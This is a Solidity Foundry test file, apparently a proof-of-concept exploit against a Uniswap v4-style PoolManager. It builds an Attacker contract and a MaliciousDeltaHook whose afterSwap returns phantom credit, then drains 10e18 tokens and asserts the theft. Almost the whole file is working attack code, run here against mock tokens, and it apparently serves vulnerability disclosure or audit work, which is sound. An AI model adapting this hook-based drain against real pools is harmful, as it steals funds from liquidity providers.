// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {MaliciousDeltaHook} from "../src/mocks/MaliciousDeltaHook.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {CurrencyLibrary} from "../src/types/CurrencyLibrary.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";

contract Attacker {
    IPoolManager public manager;
    MaliciousDeltaHook public hook;
    PoolKey public key;
    address public owner;

    constructor(address _manager, address _hook) {
        manager = IPoolManager(_manager);
        hook = MaliciousDeltaHook(_hook);
        owner = msg.sender;
    }
    function setKey(PoolKey memory _k) external { key = _k; }

    function attack() external {
        manager.unlock(abi.encode(1));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(manager));
        // 1. Do swap - afterSwap will return 10e18 phantom credit
        SwapParams memory params = SwapParams(false, -0.1e18, TickMath.MAX_SQRT_PRICE - 1);
        BalanceDelta empty;
        manager.swap(key, params, "");

        // 2. NOW drain the phantom credit with take() - THIS IS THE KEY STEP
        // Pool thinks we have +10e18, so take() succeeds
        hook.drain(10e18);
        return "";
    }
}

contract POC is Test {
    PoolManager manager;
    MaliciousDeltaHook hook;
    MockERC20 token0; MockERC20 token1;
    Attacker attacker;

    function setUp() public {
        token0 = new MockERC20("T0","T0", 18); token1 = new MockERC20("T1","T1", 18);
        manager = new PoolManager(address(this));
        // Deploy malicious hook with 128 + 2048 flags
        uint160 flags = uint160(Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address hookAddr = address(flags);
        deployCodeTo("MaliciousDeltaHook.sol:MaliciousDeltaHook", abi.encode(address(manager)), hookAddr);
        hook = MaliciousDeltaHook(hookAddr);
        token0.mint(address(manager), 100e18); token1.mint(address(manager), 100e18);
        token0.mint(address(this), 10e18);
        PoolKey memory key = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, IHooks(address(hook)));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
        manager.modifyLiquidity(key, ModifyLiquidityParams(0, 60, 10e18, bytes32(0)), "");
        attacker = new Attacker(address(manager), address(hook));
        attacker.setKey(key);
        hook.setAttacker(address(attacker));
    }

    function test_E2E_PoolInsolvency() public {
        uint balPMBefore = token1.balanceOf(address(manager));
        uint balAttackerBefore = token1.balanceOf(address(attacker));

        attacker.attack(); // unlock -> swap -> afterSwap 10e18 -> take() -> transfer

        uint balPMAfter = token1.balanceOf(address(manager));
        uint balAttackerAfter = token1.balanceOf(address(attacker));

        console.log("PM Before", balPMBefore);
        console.log("PM After", balPMAfter);
        console.log("PM Loss", balPMBefore - balPMAfter);
        console.log("Attacker Profit", balAttackerAfter - balAttackerBefore);

        // PROOF 3,4,5
        assertLt(balPMAfter, balPMBefore, "PoolManager lost real tokens");
        assertEq(balPMAfter, balPMBefore - 10e18, "Lost exactly phantom amount");
        assertEq(balAttackerAfter - balAttackerBefore, 10e18, "Attacker stole 10e18");
        // If we reach here, unlock succeeded with NonzeroDeltaCount == 0
    }
}